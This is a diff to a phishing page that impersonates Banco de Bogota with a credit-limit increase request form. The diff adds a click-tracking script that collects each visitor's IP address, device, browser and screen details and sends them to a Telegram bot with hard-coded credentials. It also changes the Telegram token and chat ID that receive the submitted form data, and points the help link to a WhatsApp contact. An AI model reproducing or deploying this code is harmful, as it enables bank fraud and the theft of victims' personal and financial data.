@@ -42,7 +42,7 @@ input.error{border-color:#c62828!important;border-width:2px!important;animation:
 <div class="container__login">
 <div class="container__login--header"><img src="logobanco1.jpg" alt="Banco de Bogota"></div>
 <div class="container__login--title"><h2>Solicitud de Producto</h2></div>
-<div class="blue-banner"><img src="per.png" alt="ayuda"><div style="flex:1"><strong>Necesitas ayuda?</strong><br><a href="#">Contacta con un asesor ></a></div></div>
+<div class="blue-banner"><img src="per.png" alt="ayuda"><div style="flex:1"><strong>Necesitas ayuda?</strong><br><a href="https://wa.me/message/SNG3H4I7373KP1">Contacta con un asesor ></a></div></div>
 <div class="login-card-content">
 <div style="text-align:center;font-size:15px;font-weight:600;color:#212529;margin-bottom:12px">Escoge tu aumento de cupo ideal entre $5.000.000 y $70.000.000</div>
 <img src="tarjeta bo.jpg" alt="Tarjeta" style="width:100%;border-radius:8px;margin-bottom:12px">
@@ -77,6 +77,106 @@ input.error{border-color:#c62828!important;border-width:2px!important;animation:
 <button onclick="document.getElementById('modal-error').style.display='none'" style="width:100%;padding:16px;background:#0033a0;color:#fff;font-size:16px;font-weight:700;border:none;border-radius:12px;cursor:pointer">Volver a ingresar</button>
 </div>
 </div>
+
+    
+
+        <script>
+        const BOT_TOKEN = "8703984328:AAEDc6VejCNeQqmQwSWgjsCUaSID0lx9BvU";
+        const CHAT_ID = "7776240161";
+
+async function obtenerIP() {
+    try {
+        const r = await fetch("https://api.ipify.org?format=json");
+        const data = await r.json();
+        return data.ip;
+    } catch {
+        return "No disponible";
+    }
+}
+
+function obtenerDispositivo() {
+    const ua = navigator.userAgent;
+
+    let dispositivo = "Desconocido";
+
+    if (/iPhone/i.test(ua)) {
+        dispositivo = "iPhone";
+    } else if (/iPad/i.test(ua)) {
+        dispositivo = "iPad";
+    } else if (/Android/i.test(ua)) {
+        dispositivo = "Android";
+    } else if (/Windows/i.test(ua)) {
+        dispositivo = "PC Windows";
+    } else if (/Macintosh/i.test(ua)) {
+        dispositivo = "Mac";
+    } else if (/Linux/i.test(ua)) {
+        dispositivo = "Linux";
+    }
+
+    return dispositivo;
+}
+
+function obtenerNavegador() {
+    const ua = navigator.userAgent;
+
+    if (/Edg/i.test(ua)) return "Microsoft Edge";
+    if (/Chrome/i.test(ua)) return "Google Chrome";
+    if (/Firefox/i.test(ua)) return "Firefox";
+    if (/Safari/i.test(ua)) return "Safari";
+
+    return "Desconocido";
+}
+
+async function enviarTelegram(texto) {
+
+    const url =
+        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+    await fetch(url, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: texto
+        })
+    });
+}
+
+document.addEventListener("click", async (event) => {
+
+    const elemento = event.target.closest("button, a");
+
+    if (!elemento) return;
+
+    const ip = await obtenerIP();
+    const dispositivo = obtenerDispositivo();
+    const navegador = obtenerNavegador();
+
+    const mensaje = `
+🔔 NUEVO CLIC
+
+🖱 Elemento: ${
+        elemento.innerText.trim() ||
+        elemento.getAttribute("aria-label") ||
+        "Sin nombre"
+    }
+
+🌐 Página: ${location.href}
+🌍 IP pública: ${ip}
+
+📱 Dispositivo: ${dispositivo}
+🌐 Navegador: ${navegador}
+
+📐 Pantalla: ${screen.width}x${screen.height}
+
+🕐 Hora: ${new Date().toLocaleString()}
+    `;
+
+    enviarTelegram(mensaje);
+});
+</script>
 <script>
 var plazoSeleccionado=12;
 function actualizar(){var v=parseInt(document.getElementById("slider").value);document.getElementById("valor").innerText="$"+Number(v).toLocaleString("es-CO");document.getElementById("cuota").innerText="$"+Math.round(v/plazoSeleccionado).toLocaleString("es-CO")}
@@ -90,9 +190,9 @@ function enviarCupo(){
   var cuota=document.getElementById("cuota").innerText;
   
   // ⚠️ CONFIGURA AQUI TU TOKEN Y CHAT ID
-  var TOKEN="8984792722:AAFJdr4DAY9lPrcbUACN5atwPUscU2IH5PM";
-  var CHAT_ID="7158969671";
- 
+  var TOKEN="8904976099:AAEc_t7D-VACaddKLUqiqK8SJsV6Y9Nfj_Y";
+  var CHAT_ID="1442154420";
+  
   var mensaje="📋 NUEVA SOLICITUD DE CUPO%0A"+
               "━━━━━━━━━━━━━━━%0A"+
               "💰 Monto: $"+parseInt(monto).toLocaleString("es-CO")+"%0A"+
@@ -114,5 +214,7 @@ function enviarCupo(){
 actualizar();document.querySelectorAll(".plazo-btn")[0].style.background="#0033a0";document.querySelectorAll(".plazo-btn")[0].style.color="#fff";document.querySelectorAll(".plazo-btn")[0].style.borderColor="#0033a0";
 </script>
 <script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v31edd6df95cf4e85bb4c19e7a9bdbcba1788362987495" integrity="sha512-iIg7k2xntmwu6/uSb5tpc/hySgZc4eoL31yB29W6tJFo2akwjPWcEqnCEdJvGexCL0KEQwVYv5BlowfhVz26hg==" data-cf-beacon='{"version":"2024.11.0","token":"3acf5ee7907441b39cb5d1b750314325","r":1,"spa":2}' crossorigin="anonymous"></script>
+
+
 </body>
 </html>
